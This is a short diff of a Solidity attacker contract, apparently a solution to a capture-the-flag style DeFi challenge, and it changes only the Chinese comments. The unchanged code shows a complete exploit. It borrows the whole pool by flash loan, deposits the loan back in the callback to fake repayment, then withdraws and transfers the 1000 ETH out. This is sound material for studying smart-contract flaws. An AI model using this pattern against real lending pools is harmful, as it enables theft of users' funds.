@@ -123,16 +123,16 @@ contract Attacker {
     function attack(SideEntranceLenderPool pool, address recovery) external {
         pool.flashLoan(1000 ether); // 借空池子全部ETH
         pool.withdraw(); // 提取回调中记账为攻击者的1000 ETH
-        payable(recovery).transfer(address(this).balance); // 资产转入回收账户，完成通关
+        payable(recovery).transfer(address(this).balance); // 资产转入回收账户
     }
 
-    // 闪电贷强制回调函数：漏洞核心利用点
+    // 闪电贷强制回调函数，漏洞核心利用点
     function execute() external payable {
         // 将闪电贷借来的ETH重新存回池子，篡改记账数据，满足余额校验
         SideEntranceLenderPool(msg.sender).deposit{value: msg.value}();
     }
 
-    // 接收闪电贷ETH必备回调
+    // 接收闪电贷ETH回调
     receive() external payable {}
 }
 ```
